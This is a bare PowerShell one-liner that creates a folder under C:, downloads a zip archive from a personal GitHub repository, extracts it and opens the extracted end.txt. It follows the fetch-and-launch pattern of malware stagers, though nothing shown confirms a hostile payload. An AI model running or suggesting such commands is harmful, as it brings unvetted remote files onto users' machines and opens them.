ni 'C:/Temps/' -Type Directory -Force;cd 'C:/Temps/';Invoke-WebRequest -Uri "https://github.com/Arcsin002/notes/raw/main/test2/end.zip" -OutFile 'end.zip';Expand-Archive -Path 'end.zip' -DestinationPath 'C:/Temps/';start 'C:/Temps/end.txt'